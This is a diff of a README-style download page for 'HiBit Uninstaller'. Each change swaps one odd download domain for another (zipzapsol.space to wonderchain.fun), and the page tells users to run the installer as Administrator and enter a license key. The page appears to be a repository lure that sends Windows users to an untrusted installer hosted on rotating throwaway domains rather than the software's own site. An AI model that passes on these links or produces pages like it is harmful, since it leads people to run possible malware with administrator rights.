@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **HiBit Uninstaller** for Windows.
 
 <p align="center">
-  <a href="https://hibit.zipzapsol.space/">
+  <a href="https://hibit.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-HiBit%20Uninstaller-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download HiBit Uninstaller">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[hibit.zipzapsol.space](https://hibit.zipzapsol.space/)** |
-| **Full URL** | `https://hibit.zipzapsol.space/` |
+| **Direct link** | **[hibit.wonderchain.fun](https://hibit.wonderchain.fun/)** |
+| **Full URL** | `https://hibit.wonderchain.fun/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — hibit.zipzapsol.space](https://hibit.zipzapsol.space/)** (link above)
+1. Click **[Download — hibit.wonderchain.fun](https://hibit.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://hibit.zipzapsol.space/"><strong>⬇ Download HiBit Uninstaller now</strong></a></p>
+<p align="center"><a href="https://hibit.wonderchain.fun/"><strong>⬇ Download HiBit Uninstaller now</strong></a></p>
 
 ---
 
